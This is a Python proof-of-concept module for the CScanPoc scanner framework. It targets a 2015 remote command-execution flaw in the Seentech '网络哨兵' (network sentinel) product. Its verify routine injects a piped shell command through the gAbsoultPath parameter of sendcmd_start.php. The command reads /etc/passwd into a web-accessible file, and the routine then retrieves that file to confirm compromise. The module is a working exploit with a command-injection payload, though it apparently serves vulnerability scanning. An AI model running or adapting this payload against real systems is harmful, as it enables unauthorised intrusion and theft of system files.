# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'seentech_0012' # 平台漏洞编号，留空
    name = '中科新业网络哨兵 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-07-02'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵 ucenter/remotewh/sendcmd_start.php 函数参数过滤不严谨，导致可执行任意命令。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a09e0db5-7402-40b0-a9a5-0e1613f2cd0b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0123369
            payload1 = "/ucenter/remotewh/sendcmd_start.php?gAbsoultPath=x | cat /etc/passwd > a.txt | "
            payload2 = "/ucenter/remotewh/a.txt"
            verify_url = self.target + payload2
            requests.get(self.target + payload1)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'root:/bin/bash' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
